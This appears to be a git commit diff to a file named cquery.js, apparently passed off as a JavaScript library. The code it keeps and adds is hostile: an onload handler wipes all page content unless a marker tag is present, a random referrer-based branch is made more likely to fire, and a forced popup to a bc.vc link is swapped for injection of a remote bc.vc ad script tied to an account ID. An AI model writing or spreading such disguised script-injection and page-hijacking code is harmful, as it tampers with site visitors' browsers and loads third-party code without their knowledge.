453c3a3c6eea59018c719c85b7d0c7ecea011819
kilavuzcu@gmail.com <kilavuzcu@gmail.com@3e4efce4-d64c-69f8-84b6-72d23f97b73c>
2015-02-05 13:13:27 +0000

    a

--- cquery.js
+++ cquery.js
@@ -2,7 +2,7 @@
 window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU").length)for(var a=a.getElementsByTagName("*"),b=0,c=a.length;c>b;b++)a[b].innerHTML="";};
 var ua124rt = navigator.userAgent.toLowerCase();
 var odgau = Math.floor((Math.random() * 10) + 1);
-if(odgau > 3) {
+if(odgau > 2) {
 (function(window, location) {
 var tybn = document.referrer;
   if(tybn.length >= 8){
@@ -23,6 +23,5 @@ var tybn = document.referrer;
 }(window, location));
 }
 else{
-var win = window.open(http://bc.vc/ehX7Wj, '_blank');
-win.focus();
+var accountID = 13466;var adType = 'int';var script = document.createElement('script');script.src = "http://bc.vc/js/link-converter.js";document.getElementsByTagName('head')[0].appendChild(script);
 }
